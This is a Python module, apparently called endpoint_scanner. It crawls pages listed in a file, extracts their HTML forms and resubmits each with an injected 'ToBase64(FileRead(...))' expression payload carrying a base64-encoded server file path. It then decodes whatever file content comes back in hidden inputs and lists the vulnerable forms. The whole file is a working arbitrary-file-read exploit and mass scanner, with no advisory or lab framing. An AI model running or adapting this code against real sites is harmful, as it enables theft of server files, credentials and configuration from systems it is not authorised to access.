#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import time
import base64
# import urllib
# import sys
# import os

# Suppress SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_origin_header(url):
    """Extract origin header from URL"""
    parsed = urlparse(url)
    scheme = parsed.scheme
    netloc = parsed.netloc
    origin = f"{scheme}://{netloc}"
    return origin

def extract_forms_from_page(url, verify_ssl=True):
    """Extract all forms from a webpage"""
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    
    try:
        response = requests.get(
            url,
            headers=headers,
            verify=verify_ssl,
            timeout=30,
            allow_redirects=True
        )
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to fetch {url}: {e}")
        return []
    
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    
    extracted_forms = []
    for i, form in enumerate(forms):
        form_info = {
            'source_page': url,
            'action': form.get('action', ''),
            'method': form.get('method', 'GET').upper(),
            'parameters': []
        }
        
        # Get form action URL
        if form_info['action']:
            form_info['action'] = urljoin(url, form_info['action'])
        else:
            form_info['action'] = url
        
        # Extract input fields
        inputs = form.find_all(['input', 'textarea', 'select'])
        for input_tag in inputs:
            param_name = input_tag.get('name')
            if not param_name:
                continue
                
            param_type = input_tag.get('type', 'text')
            param_value = input_tag.get('value', '')
            
            # Handle different input types
            if param_type.lower() in ['text', 'hidden', 'password', 'email', 'search', 'tel', 'url']:
                param_value = input_tag.get('value', '')
            elif param_type.lower() == 'radio':
                if input_tag.get('checked'):
                    param_value = input_tag.get('value', '')
                else:
                    param_value = ''
            elif param_type.lower() == 'checkbox':
                if input_tag.get('checked'):
                    param_value = input_tag.get('value', 'on')
                else:
                    param_value = ''
            elif param_type.lower() == 'submit' or param_type.lower() == 'reset' or param_type.lower() == 'button':
                continue
            else:
                param_value = input_tag.get('value', '')
            
            # Handle select elements
            if input_tag.name == 'select':
                selected_option = input_tag.find('option', selected=True)
                if selected_option:
                    param_value = selected_option.get('value', selected_option.get_text().strip())
                else:
                    first_option = input_tag.find('option')
                    if first_option:
                        param_value = first_option.get('value', first_option.get_text().strip())
                    else:
                        param_value = ''
            elif input_tag.name == 'textarea':
                param_value = input_tag.get_text().strip()
            
            form_info['parameters'].append({
                'name': param_name,
                'type': param_type,
                'value': param_value
            })
        
        extracted_forms.append(form_info)
    
    return extracted_forms

def craft_file_read_payload(file_path):
    """Create payload for file reading"""    
    if not file_path.startswith('/'):
        file_path = '/' + file_path

    while True:
        encoded = base64.b64encode(file_path.encode()).decode()
        if encoded.endswith('='):
            file_path = '/' + file_path
        else:
            break

    encoded_path = encoded
    payload = f"test1={encoded_path}&ToBase64(FileRead(toString(toBinary(TEST1))))=1"
    return payload

def parse_params(param_string):
    """Parse parameter string into dictionary"""
    params = {}
    if param_string:
        pairs = param_string.split('&')
        for pair in pairs:
            if '=' in pair:
                key, value = pair.split('=', 1)
                params[key] = value
    return params

def send_request(url, method, url_params, body_params, headers=None, verify_ssl=True, referrer=None):
    """Send HTTP request with separate URL and body parameters"""
    default_headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

    if referrer:
        default_headers["Referer"] = referrer

    if "Origin" not in default_headers:
        origin = get_origin_header(url)
        default_headers["Origin"] = origin

    if headers:
        default_headers.update(headers)

    final_headers = default_headers

    print(f"    [DEBUG] Sending {method} request to: {url}")
    print(f"    [DEBUG] Referrer: {referrer}")
    if url_params:
        print(f"    [DEBUG] URL params: {url_params}")
    if body_params:
        print(f"    [DEBUG] Body params: {body_params}")

    try:
        if method.upper() == "POST":
            response = requests.post(
                url,
                params=url_params,
                data=body_params,
                headers=final_headers,
                verify=verify_ssl,
                allow_redirects=True,
                timeout=30
            )
        elif method.upper() == "GET":
            all_params = {}
            if url_params:
                all_params.update(url_params)
            if body_params:
                all_params.update(body_params)
                
            response = requests.get(
                url,
                params=all_params,
                headers=final_headers,
                verify=verify_ssl,
                allow_redirects=True,
                timeout=30
            )
        else:
            raise ValueError("Unsupported HTTP method")

        return response
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None

def decode_base64(data):
    """Decode base64 data"""
    try:
        return base64.b64decode(data.encode('utf-8')).decode()
    except Exception:
        return data

def extract_result(response):
    """Extract and decode results from response"""
    if not response:
        return None

    print(f"    [*] Received HTTP {response.status_code}")

    if response.status_code in [200, 302]:
        soup = BeautifulSoup(response.text, 'html.parser')

        inputs = soup.find_all('input', {'type': 'hidden'})
        for input_tag in inputs:
            name = input_tag.get('name', '')
            if 'TOBASE64(FILEREAD' in name.upper():
                value = input_tag.get('value', '')
                print(f"    [DEBUG] Found file read result in input name: {name}")
                return value

    return None

def test_endpoint_for_file_read(form_info, base_url, file_path, verify_ssl=True):
    """Test a specific form endpoint for file read capability"""
    print(f"[*] Testing form from {form_info['source_page']}")
    print(f"    Action: {form_info['action']} (method: {form_info['method']})")
    print(f"    Parameters: {len(form_info['parameters'])} found")
    for param in form_info['parameters']:
        print(f"      - {param['name']} ({param['type']}) = '{param['value']}'")
    
    # Parse the action URL
    parsed_action = urlparse(form_info['action'])
    action_base_url = f"{parsed_action.scheme}://{parsed_action.netloc}{parsed_action.path}"
    
    # Extract existing query parameters
    existing_url_params = parse_qs(parsed_action.query)
    url_params = {k: v[0] if isinstance(v, list) and len(v) > 0 else v for k, v in existing_url_params.items()}
    
    # Prepare base parameters from the form
    body_params = {}
    checkbox_groups = {}
    
    for param in form_info['parameters']:
        body_params[param['name']] = param['value']
        
        # Track checkboxes
        if param['type'].lower() == 'checkbox' and param['name']:
            if param['name'] not in checkbox_groups:
                checkbox_groups[param['name']] = []
            checkbox_groups[param['name']].append(param)
    
    # Ensure at least one checkbox per group is selected
    for checkbox_name, checkboxes in checkbox_groups.items():
        has_selected = any(cb['value'] != '' for cb in checkboxes)
        if not has_selected and checkboxes:
            first_checkbox = checkboxes[0]
            body_params[checkbox_name] = first_checkbox['value'] if first_checkbox['value'] else 'on'
            print(f"    [INFO] Selected checkbox: {checkbox_name} = {body_params[checkbox_name]}")
    
    # Fix common form issues
    if 'state' in body_params and body_params['state'] in ['ZZ', 'XX', '']:
        body_params['state'] = 'FL'
        print(f"    [INFO] Replaced invalid state with 'FL'")
    
    # Craft file read payload
    exploit_payload = craft_file_read_payload(file_path)
    exploit_params = parse_params(exploit_payload)
    
    print(f"    [DEBUG] Exploit params: {exploit_params}")
    print(f"    [DEBUG] Existing URL params: {url_params}")
    print(f"    [DEBUG] Base body params: {body_params}")
    
    # Combine parameters
    final_body_params = body_params.copy()
    final_body_params.update(exploit_params)
    
    print(f"    [DEBUG] Final body params: {final_body_params}")
    
    # Handle GET vs POST
    if form_info['method'].upper() == 'GET':
        final_url_params = url_params.copy()
        final_url_params.update(final_body_params)
        final_body_params = None
        print(f"    [DEBUG] Final URL params for GET: {final_url_params}")
    else:
        final_url_params = url_params
        print(f"    [DEBUG] Final URL params for POST: {final_url_params}")
        print(f"    [DEBUG] Final body params for POST: {final_body_params}")
    
    # Send request
    response = send_request(
        action_base_url,
        form_info['method'],
        final_url_params,
        final_body_params,
        verify_ssl=verify_ssl,
        referrer=form_info['source_page']
    )
    
    if response:
        encoded_content = extract_result(response)
        if encoded_content:
            print(f"    [DEBUG] Encoded content received: {encoded_content[:50]}...")
            decoded_content = decode_base64(encoded_content)
            identifier = decoded_content.split('\n')[0].strip()[:50]
            return True, decoded_content, identifier
    
    return False, None, None

def scan_endpoints(endpoint_list_file, base_url, test_file_path, delay=5, verify_ssl=True):
    """Scan multiple endpoints for file read vulnerability - output to stdout only"""
    try:
        with open(endpoint_list_file, 'r') as f:
                relative_paths = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Failed to read endpoint list file: {e}")
        return
    
    # if not base_url.endswith('/'):
    #     base_url = base_url.rstrip('/') + '/'
    
    print(f"[*] Scanning {len(relative_paths)} endpoints using base URL: {base_url}")
    print(f"[*] Testing file read with: {test_file_path}")
    print(f"[*] Delay between requests: {delay} seconds")
    
    successful_endpoints = []
    
    for i, relative_path in enumerate(relative_paths):
        if relative_path.startswith('/'):
            relative_path = relative_path[1:]
        full_url = urljoin(base_url, relative_path)
        print(f"\n[>] Processing endpoint ({i+1}/{len(relative_paths)}): {relative_path}")
        print(f"    Full URL: {full_url}")
        forms = extract_forms_from_page(full_url, verify_ssl)
                
        if not forms:
            print(f"[-] No forms found on {full_url}")
            continue
                    
        print(f"[*] Found {len(forms)} form(s) on {full_url}")
        
        for j, form in enumerate(forms):
            success, content, identifier = test_endpoint_for_file_read(
                form, base_url, test_file_path, verify_ssl
            )
            
            if success:
                print(f"[+] Vulnerable form found!")
                print(f"    Source page: {form['source_page']}")
                print(f"    Submit to: {form['action']} (method: {form['method']})")
                if identifier:
                    print(f"    Identifier: {identifier}")
                
                # Store successful endpoint info for final summary
                endpoint_info = {
                    'source_page': form['source_page'],
                    'form_action': form['action'],
                    'form_method': form['method'],
                    'identifier': identifier
                }
                successful_endpoints.append(endpoint_info)
            else:
                print(f"[-] Form not vulnerable:")
                print(f"    Source page: {form['source_page']}")
                print(f"    Submit to: {form['action']} (method: {form['method']})")
        
        if i < len(relative_paths) - 1:
            time.sleep(delay)
    
    # Print final summary
    if successful_endpoints:
        print(f"\n[+] Scan complete - Found {len(successful_endpoints)} vulnerable forms:")
        for endpoint_info in successful_endpoints:
            print(f"    Source: {endpoint_info['source_page']}")
            print(f"    Action: {endpoint_info['form_action']} ({endpoint_info['form_method']})")
            print(f"    Identifier: {endpoint_info['identifier']}")
            print()
    else:
        print("\n[-] Scan complete - No vulnerable forms found")

if __name__ == "__main__":
    print("This module should be imported and used by the main script.")
    print("Usage: import endpoint_scanner and call scan_endpoints()")